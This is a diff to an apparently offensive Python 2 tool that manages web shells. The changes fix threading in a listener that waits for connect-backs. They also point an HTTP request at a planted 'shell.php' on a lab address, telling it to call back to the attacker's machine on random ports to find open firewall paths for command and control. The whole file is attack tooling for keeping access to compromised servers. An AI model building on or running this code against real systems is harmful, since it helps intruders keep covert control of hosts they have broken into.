@@ -7,13 +7,16 @@ import socket
 import shells
 import encoders
 import random
+import time
 
 
 #variables related to threading
 database_lock = threading.Lock()#serialize access to the database
-generator_lock = threading.Lock()#serialize access to the generator
 
-port_condition = threading.Condition()#condition to tell the socket listener to prematurely exit or not
+#condition to tell the socket listener to prematurely exit or not
+#automatically will create a lock due to conditions 
+listener_abort_event = threading.Event()
+listener_success_event = threading.Event()
 
 ###next section is for threading combined with sockets
 class threading_network_listener(threading.Thread):
@@ -28,6 +31,9 @@ class threading_network_listener(threading.Thread):
 		self.port = port#the intended port for the thread to listen on
 		self.listen_sock = None#the actual socket listening on the port
 		self.message = None
+		self.gen = manage_random_list()
+		self.get_next_socket_number()
+		self.socket = self.create_socket()
 
 	def create_socket(self):
 		""" Creates a socket for the thread to listen on """
@@ -37,17 +43,12 @@ class threading_network_listener(threading.Thread):
 		print "network listener socket bound to port ",self.port
 		return listen_socket
 
-	def get_generated_socket_number(self):
+	def get_next_socket_number(self):
 		"""
 			Handles the locking of the generator lock so the class can safely
 			grab a number from the generator
 		"""
-		global generator_lock
-		generator_lock.acquire()
-		global generator
-		self.port = generator.next()
-		generator_lock.release()
-
+		self.port = self.gen.next()
 	
 	def run(self):
 		"""
@@ -56,15 +57,19 @@ class threading_network_listener(threading.Thread):
 			If there is a transmission on this socket then this thread will add
 			the entry to the database
 		"""
-		self.get_generated_socket_number()
-		self.socket = self.create_socket()
+		global listener_abort_event
+		
 
 		#we only need to accept once in this scenario.
 		(sock, address) = self.socket.accept()
 
-		#print dir(sock)
 		data = sock.recv(50)
-		if(data == "ok"):
+
+		time.sleep(.4)#waiting for .4 seconds for the network to respond
+		if listener_abort_event.isSet():#need to abort
+			pass
+		#if(data == "ok"):#the network message that will be sent to let us know the firewall is open
+		else:#should be the case that the firewall is open
 			global database_name
 			global current_shell_id
 			print str(data)
@@ -74,7 +79,7 @@ class threading_network_listener(threading.Thread):
 			conn = sqlite3.connect(database_name)	
 			cursor = conn.cursor()
 			cursor.execute("insert into open_ports(id,port_no) values (?,?)",[(current_shell_id),(self.port)])
-			cursor.commit()
+			conn.commit()
 			database_lock.release()
 
 		#cleanup
@@ -89,7 +94,7 @@ class threading_http_request(threading.Thread):
 		Will notify the threading_network_listener thread in the event
 		of an error that the remote server can't connect back.
 	"""
-	def __init__(self,url=None,port=None,self_ip=None,message=None):
+	def __init__(self,url=None,port=None,self_ip=None,message="ok"):
 		threading.Thread.__init__(self)
 		self.url = url#the url that this thread will connect to.
 		self.port = port#the port that the web request will connect to
@@ -103,8 +108,12 @@ class threading_http_request(threading.Thread):
 		try:
 			query_string = "http://" +self.url + "?p=" + str(self.port) +"&i=" + self.ip + "&m=" + self.message
 			response = urllib2.urlopen(query_string)
+			if response == "error":#port is blocked
+				#global listener_abort_event.set()
+				global listener_abort_event
+				listener_abort_event.set()
 		except ValueError:#something is wrong with the url
-			pass
+			print "something went wrong"
 
 
 #global variables
@@ -236,12 +245,12 @@ def run_candidate_threads(thread_count, timing):
 		command and control candidate.
 	"""
 	
-	net_listen = threading_network_listener()
+	net_listen = threading_network_listener()#will call a generator and 
 	net_listen.start()
-	http_thread = threading_http_request("localhost",net_listen.port,"127.0.0.1","itch")
+	print net_listen.port
+	http_thread = threading_http_request("192.168.56.102/shell.php",net_listen.port,"192.168.56.101","ok")
 	http_thread.start()
 
-	
 def check_candidacy():
 	"""
 		script that starts the process of checking a candidacy for a specific 
@@ -278,12 +287,12 @@ def keyboardHandler(signal, frame):
 def initialize():
 	"""Handles the initialization for the entire program"""
 	#creates a list of port numbers to check for candidacy of a specific web shell
-	#TODO move this over to a class because we are going to have to do this for 
+	#TODO move this over to an object because we are going to have to do this for 
 	#each webshell and this is inefficient at the moment.
 	for i in range(1025,65536):
 		port_list.append(i)
 	global generator
-	generator = manage_random_list()
+	#generator = manage_random_list()
 
 def main():
 	#initialization function
@@ -291,7 +300,7 @@ def main():
 
 	#handles keyboard interrupts gracefully
 	signal.signal(signal.SIGINT, keyboardHandler)
-	a = threading_network_listener()
+	#a = threading_network_listener()
 
 	while 1:
 		get_input()
